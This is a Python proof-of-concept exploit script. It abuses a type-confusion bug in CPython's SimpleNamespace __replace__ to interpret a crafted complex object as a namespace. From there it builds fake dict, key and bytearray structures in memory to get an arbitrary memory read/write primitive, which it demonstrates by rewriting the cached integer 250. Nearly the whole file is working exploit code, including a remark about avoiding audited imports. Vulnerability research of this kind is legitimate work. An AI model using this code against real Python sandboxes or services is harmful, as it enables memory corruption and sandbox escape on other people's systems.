"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Type confusion bug to interpret any object as a namespace object.
#       Gives us a fake dict primitive which we can make to have our evil obj in.
# Tested to work on 3.13.0, 3.13.1, 3.14.0 (GIL enabled version)

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/namespaceobject.c#L226
"""
static PyObject *
namespace_replace(PyObject *self, PyObject *args, PyObject *kwargs)
{
    if (!_PyArg_NoPositional("__replace__", args)) {
        return NULL;
    }

    PyObject *result = PyObject_CallNoArgs((PyObject *)Py_TYPE(self)); // <--- does `type(self)()` which calls
                                                                               type(self).__new__(type(self)), but we can control __new__
                                                                               and return whatever we want
    if (!result) {
        return NULL;
    }
    if (PyDict_Update(((_PyNamespaceObject*)result)->ns_dict, // <--- assumes `result` is a namespace object without any prior checks
                      ((_PyNamespaceObject*)self)->ns_dict) < 0)
    {
        Py_DECREF(result);
        return NULL;
    }
    if (kwargs) {
        if (PyDict_Update(((_PyNamespaceObject*)result)->ns_dict, kwargs) < 0) { // <--- assumes `result` is a namespace object without any prior checks
            Py_DECREF(result);
            return NULL;
        }
    }
    return result;
}
"""

# with this bug we get full control of an arbitrary object that will be interpreted as a dict, so we can create a fake object
# and extract it when the __eq__ func of the object gets called during insertion of the item

# WARNING: A lot of fake structs need to be built, prepare yourself

i2f = lambda num: 5e-324 * num
p64 = lambda num: num.to_bytes(8, 'little')
p32 = lambda num: num.to_bytes(4, 'little')
p8 = lambda num: num.to_bytes(1, 'little')

KEY = "my_awesome_key" # can be whatever string you want

class Catch:
    __slots__ = ("mem",)
    def __eq__(self, other):
        global mem
        mem = self.mem
        return True

# helper function to get the address of the start of a fake object
fid = lambda obj: id(obj) + bytes.__basicsize__ - 1

fake_ba = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) +
    p64(0)
)

fake_obj = (
    p64(0x1111) +
    p64(id(Catch)) +
    p64(fid(fake_ba))
)

# PyDictKeyEntry
# https://github.com/python/cpython/blob/v3.14.0/Include/internal/pycore_dict.h#L74-L79
fake_key = (
    p64(hash(KEY) % 2**64) + # me_hash
    p64(fid(fake_obj)) +     # me_key
    p64(0)                   # me_value (unused in this case)
)

# _dictkeysobject
# https://github.com/python/cpython/blob/v3.14.0/Include/internal/pycore_dict.h#L171-L215
fake_keys = (
    p64(0x123456) + # dk_refcnt
    p8(3) +         # dk_log2_size
    p8(3) +         # dk_log2_index_bytes
    p8(0) +         # dk_kind
    p8(0) +         # padding
    p32(0) +        # dk_version
    p64(1) +        # dk_usable
    p64(1) +        # dk_nentries
    b"\0"*8 +       # indices (of size 1 << dk_log2_index_bytes)
    fake_key        # values
)

# PyDictObject
# https://github.com/python/cpython/blob/v3.14.0/Include/cpython/dictobject.h#L11-L33
fake_dict = (
    p64(0x1234) +         # ob_refcount
    p64(id(dict)) +       # ob_base
    p64(1) +              # ma_used
    p64(0) +              # _ma_watcher_tag
    p64(fid(fake_keys)) + # ma_keys
    p64(0)                # ma_values
)

import sys # sys isn't an audited import
SimpleNamespace = type(sys.implementation)

class broken(SimpleNamespace):
    pass

# To properly exploit this, we need to find an object that lets us put an arbitrary
# value in the same spot as `ns_dict` in the `_PyNamespaceObject` struct

# Here is what that struct looks like as of 3.13.0
"""
typedef struct {
    Py_ssize_t ob_refcnt;
    PyTypeObject *ob_type;
    PyObject *ns_dict;
} _PyNamespaceObject;
"""

# So we need to find an object that will allow us to put arbitrary data into obj+0x10, and
# wouldn't you know it, the complex object comes to save the day again
"""
typedef struct {
    Py_ssize_t ob_refcnt;
    PyTypeObject *ob_type;
    Py_complex cval;
} PyComplexObject;
"""

# So we can use the `real` member of the complex object to store our arbitrary value, which
# is what the `evil` method below implements

def evil(*unused):
    obj_addr = fid(fake_dict)
    return 0j + i2f(obj_addr)

# We have to create the object first then set the __new__ func or else calling `broken` will
# just return our complex obj and not an actual instance of broken lol
x = broken()
broken.__new__ = evil

mem = None
x.__replace__(**{KEY: "gg"})
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100